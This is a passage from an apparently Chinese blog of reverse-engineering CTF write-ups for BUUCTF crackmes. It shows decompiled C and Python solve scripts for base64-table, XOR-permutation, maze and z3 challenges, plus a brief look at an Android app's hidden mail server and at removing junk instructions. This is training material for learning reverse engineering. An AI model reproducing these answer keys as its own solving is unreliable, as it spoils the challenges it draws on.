class="number">15</span>; ++result )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = aAbcdefghijklmn[result + <span class="number">10</span>];</span><br><span class="line">    aAbcdefghijklmn[result + <span class="number">10</span>] = aAbcdefghijklmn[result];</span><br><span class="line">    aAbcdefghijklmn[result] = v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> *__cdecl <span class="title">sub_401030</span><span class="params">(<span class="keyword">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = input[HIDWORD(v1)];</span><br><span class="line">      <span class="keyword">if</span> ( v2 &lt; <span class="number">97</span> || v2 &gt; <span class="number">122</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &lt; <span class="number">65</span> || v2 &gt; <span class="number">90</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        LOBYTE(v1) = v2 + <span class="number">32</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        LOBYTE(v1) = v2 - <span class="number">32</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      input[HIDWORD(v1)] = v1;</span><br><span class="line">LABEL_9:</span><br><span class="line">      LODWORD(v1) = <span class="number">0</span>;</span><br><span class="line">      ++HIDWORD(v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( HIDWORD(v1) &lt; <span class="built_in">strlen</span>(input) );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_401080主要是三部分：</p><ul><li>  sub_401000：换base64表</li><li>  base64</li><li>  大小写转换的操作</li></ul><p>也就是说，我们拿本地的str先大小写转换，换表，在decode就OK</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&#x27;</span>.swapcase()</span><br><span class="line">base = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">A2Z = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">base = <span class="built_in">list</span>(base)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">15</span>):</span><br><span class="line">    a = base[i]</span><br><span class="line">    base[i] = base[i+<span class="number">10</span>]</span><br><span class="line">    base[i+<span class="number">10</span>] = a</span><br><span class="line"></span><br><span class="line">base = <span class="string">&#x27;&#x27;</span>.join(base)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    flag += A2Z[base.find(<span class="built_in">str</span>[i])]</span><br><span class="line">    <span class="built_in">print</span>(A2Z[base.find(<span class="built_in">str</span>[i])], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">b = base64.b64decode(flag)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><h1 id="0x0F-MRCTF2020-Transform"><a href="#0x0F-MRCTF2020-Transform" class="headerlink" title="0x0F.[MRCTF2020]Transform"></a>0x0F.[MRCTF2020]Transform</h1><p>无壳：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> input[<span class="number">104</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_402230();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me your code:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) != <span class="number">33</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    aHknvfymgQbpaJ[i] = input[asc_40F040[i]];</span><br><span class="line">    aHknvfymgQbpaJ[i] ^= LOBYTE(asc_40F040[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">32</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( local_str[j] != aHknvfymgQbpaJ[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Right!Good Job!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is your flag: %s\n&quot;</span>, input);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>长度是33，之后和本地的一个表异或，再等于另一个字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">table = [<span class="number">9</span>,<span class="number">10</span>,<span class="number">15</span>, <span class="number">23</span>,<span class="number">7</span>,</span><br><span class="line">         <span class="number">24</span>,<span class="number">12</span>, <span class="number">6</span>, <span class="number">1</span>,</span><br><span class="line">         <span class="number">16</span>,<span class="number">3</span>,<span class="number">17</span>, <span class="number">32</span>, <span class="number">29</span>, <span class="number">11</span>,<span class="number">30</span>,</span><br><span class="line">         <span class="number">27</span>, <span class="number">22</span>,</span><br><span class="line">         <span class="number">4</span>,<span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>,</span><br><span class="line">         <span class="number">21</span>,</span><br><span class="line">         <span class="number">2</span>,</span><br><span class="line">         <span class="number">25</span>,</span><br><span class="line">         <span class="number">5</span>,</span><br><span class="line">         <span class="number">31</span>,</span><br><span class="line">         <span class="number">8</span>,</span><br><span class="line">         <span class="number">18</span>,</span><br><span class="line">         <span class="number">26</span>,</span><br><span class="line">         <span class="number">28</span>,</span><br><span class="line">         <span class="number">14</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">local_str = [</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x7F</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x42</span>, <span class="number">0x7B</span>, <span class="number">0x2D</span>, <span class="number">0x2A</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>,</span><br><span class="line">    <span class="number">0x4C</span>, <span class="number">0x57</span>, <span class="number">0x79</span>, <span class="number">0x41</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>, <span class="number">0x5C</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x4D</span>]</span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">33</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(table))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(local_str)):</span><br><span class="line">    local_str[i] ^= table[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    flag[table[i]] = local_str[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="0x10-相册"><a href="#0x10-相册" class="headerlink" title="0x10.相册"></a>0x10.相册</h1><p>根据提示说是和邮箱有关，jadx打开搜mail，有个<code>sendMailByJavaMail</code>，且第一个参数的含义大概为sendto的邮箱地址，查找交叉引用。</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211029182421975.png" alt="image-20211029182421975"></p><p>发现有个mailserver的东西，大概率就是了，反查定义，：</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211029182507735.png" alt="image-20211029182507735"></p><p>base64解码了一下。</p><p>Java中NativeMethod一般用于调用外部文件，ida打开libcore.so，查看导出(export)，</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211029182804375.png" alt="image-20211029182804375"></p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211029183044566.png" alt="image-20211029183044566"></p><p>base64解一下就好了</p><h1 id="0x11-WUSTCTF2020-level2"><a href="#0x11-WUSTCTF2020-level2" class="headerlink" title="0x11.[WUSTCTF2020]level2"></a>0x11.[WUSTCTF2020]level2</h1><p>就脱个upx就OK</p><h1 id="0x12-HDCTF2019-Maze"><a href="#0x12-HDCTF2019-Maze" class="headerlink" title="0x12.[HDCTF2019]Maze"></a>0x12.[HDCTF2019]Maze</h1><p>这个题学到知识点了。</p><p>忘了有没有壳了，有也是upx，脱了就行</p><p>ida查看是这样：</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211029232619651.png" alt="image-20211029232619651"></p><p>main下面有一堆数据，f5不了；而且上面有个jnz的指令，相当于没跳转，而call的也是个乱的地址。这段代码加了花指令，ida分析错了。</p><p>首先将jnz给nop掉，可以直接ida也可od：</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211029232903932.png" alt="image-20211029232903932"></p><p>之后是call，当然不能全nop，后面可能会有代码，按d转为字节数据：</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211029233029066.png" alt="image-20211029233029066"></p><p>然后一步步测试改为nop，之后会发现ida自动就把后面给显示为了代码，但是还是不能f5：</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211029233330994.png" alt="image-20211029233330994"></p><p>这是因为这块还不是函数，之后将红色的text选中按p，将这块弄为函数，之后就可f5了，简单的迷宫题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+10h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">16</span>]; <span class="comment">// [esp+14h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Go through the maze to get the flag!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%14s&quot;</span>, flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">13</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( flag[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        --*asc_408078;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        ++*asc_408078;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        --dword_40807C;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">        ++dword_40807C;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">//初始分别为7和0</span></span><br><span class="line">  <span class="keyword">if</span> ( *asc_408078 == <span class="number">5</span> &amp;&amp; dword_40807C == <span class="number">-4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Congratulations!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Here is the flag:flag&#123;%s&#125;\n&quot;</span>, flag);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try again...\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>迷宫如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*******+**</span><br><span class="line">******* **</span><br><span class="line">****    **</span><br><span class="line">**   *****</span><br><span class="line">** **F****</span><br><span class="line">**    ****</span><br><span class="line">**********</span><br><span class="line">//ssaaasaassdddw</span><br></pre></td></tr></table></figure><h1 id="0X13-GWCTF-2019-xxor（未完）"><a href="#0X13-GWCTF-2019-xxor（未完）" class="headerlink" title="0X13.[GWCTF 2019]xxor（未完）"></a>0X13.[GWCTF 2019]xxor（未完）</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  __int64 v6[<span class="number">6</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 v7[<span class="number">6</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v7[<span class="number">5</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let us play a game?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;you have six chances to input&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Come on!&quot;</span>);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6[<span class="number">4</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;input: &quot;</span>);</span><br><span class="line">    a2 = (v6 + <span class="number">4</span> * i);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, a2);</span><br><span class="line">  &#125;</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v7[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v7[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v7[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v7[<span class="number">4</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_601078 = v6[j];</span><br><span class="line">    dword_60107C = HIDWORD(v6[j]);</span><br><span class="line">    a2 = &amp;unk_601060;</span><br><span class="line">    sub_400686(&amp;dword_601078, &amp;unk_601060);</span><br><span class="line">    LODWORD(v7[j]) = dword_601078;</span><br><span class="line">    HIDWORD(v7[j]) = dword_60107C;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_400770(v7, a2) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO NO NO~ &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You seccess half\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do not forget to change input to hex and combine~\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ByeBye&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是输入，然后进行了一个变换，再进行了一次判断。</p><p>先看判断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400770</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1[<span class="number">2</span>] - a1[<span class="number">3</span>] == <span class="number">2225223423LL</span></span><br><span class="line">    &amp;&amp; a1[<span class="number">3</span>] + a1[<span class="number">4</span>] == <span class="number">4201428739LL</span></span><br><span class="line">    &amp;&amp; a1[<span class="number">2</span>] - a1[<span class="number">4</span>] == <span class="number">1121399208LL</span></span><br><span class="line">    &amp;&amp; *a1 == <span class="number">-548868226</span></span><br><span class="line">    &amp;&amp; a1[<span class="number">5</span>] == <span class="number">-2064448480</span></span><br><span class="line">    &amp;&amp; a1[<span class="number">1</span>] == <span class="number">550153460</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用z3简单算下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">a1 = [<span class="number">0</span>]*<span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    a1[i] = Int(<span class="string">&#x27;a1[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">s.add(a1[<span class="number">2</span>] - a1[<span class="number">3</span>] == <span class="number">0x84A236FF</span>)</span><br><span class="line">s.add(a1[<span class="number">3</span>] + a1[<span class="number">4</span>] == <span class="number">0xFA6CB703</span>)</span><br><span class="line">s.add(a1[<span class="number">2</span>] - a1[<span class="number">4</span>] == <span class="number">1121399208</span>)</span><br><span class="line">s.add(a1[<span class="number">0</span>] == -<span class="number">548868226</span>)</span><br><span class="line">s.add(a1[<span class="number">5</span>] == -<span class="number">2064448480</span>)</span><br><span class="line">s.add(a1[<span class="number">1</span>] == <span class="number">550153460</span>)</span><br><span class="line">s.check()</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a1[2] = 3774025685,</span><br><span class="line"> a1[1] = 550153460,</span><br><span class="line"> a1[5] = -2064448480,</span><br><span class="line"> a1[0] = -548868226,</span><br><span class="line"> a1[3] = 1548802262,</span><br><span class="line"> a1[4] = 2652626477</span><br></pre></td></tr></table></figure><p>之后往前看是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400686</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *temp, <span class="keyword">int</span> *table)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *temp;</span><br><span class="line">  v4 = temp[<span class="number">1</span>];</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x3F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 += <span class="number">0x458BCD42</span>;</span><br><span class="line">    v3 += (v4 + v5 + <span class="number">11</span>) ^ ((v4 